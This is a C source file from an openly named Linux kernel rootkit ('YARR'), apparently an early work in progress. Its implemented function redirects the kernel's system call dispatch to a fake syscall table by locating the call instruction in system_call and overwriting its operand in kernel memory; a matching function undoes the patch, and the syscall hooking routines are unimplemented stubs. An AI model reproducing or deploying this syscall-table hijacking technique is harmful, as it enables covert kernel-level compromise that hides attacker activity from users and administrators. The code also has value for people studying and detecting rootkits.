/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#include <asm/unistd.h>
#include <asm/desc_defs.h>

#include "debug.h"
#include "funcs.h"
#include "hook.h"
#include "interrupt.h"
#include "types.h"
#include "syscall.h"

#define CALL_OPCODE (0x008514ff)

unsigned long **real_sys_call_table = NULL;
unsigned long *fake_sys_call_table[NR_syscalls];

// TODO: Implement.
int hookEachSyscall() {
	int res = -1;

	debug("hookEachSyscall() not yet implemented.\n");
	return res;
}

int patchSystemCall() {
	unsigned long *system_call, *fake_sct_addr;
	void *call_instr;
	int i, res = -1;

	// Initializes our sys_call_table.
	real_sys_call_table = getSyscallTable();
	debug("real_sys_call_table is at %p\n", real_sys_call_table);
	for (i=0; i<NR_syscalls; i++)
		fake_sys_call_table[i] = real_sys_call_table[i];

	// TODO: Here we should hook syscalls.

	// Patch system_call().
	system_call = getIntrDesc(LINUX_SYSCALL_VECTOR);
	debug("system_call is at %p\n", system_call);
	call_instr = search_call_opcode(system_call);
	debug("call_instr is at %p\n", call_instr);
	fake_sct_addr = (unsigned long *)fake_sys_call_table;
	debug("fake_sct_addr is at %p\n", fake_sct_addr);
	kmemcpy(call_instr+3, &fake_sct_addr, sizeof(unsigned long **));
	return res;
}

// TODO: Implement.
int hookSystemCall() {
	int res = -1;

	debug("hookSystemCall() not yet implemented.\n");
	return res;
}

// TODO: Implement.
int unhookEachSyscall() {
	int res = -1;

	debug("unhookEachSyscall() not yet implemented.\n");
	return res;
}

// TODO: Implement.
int unpatchSystemCall() {
	unsigned long *system_call;
	void *call_instr;
	int res = -1;

	// Was patchSystemCall() executed?.
	if (real_sys_call_table == NULL)
		return -1;

	system_call = getIntrDesc(LINUX_SYSCALL_VECTOR);
	call_instr = search_call_opcode(system_call);
	kmemcpy(call_instr+3, &real_sys_call_table, sizeof(unsigned long **));
	return res;
}

// TODO: Implement.
int unhookSystemCall() {
	int res = -1;

	debug("unhookSystemCall() not yet implemented.\n");
	return res;
}

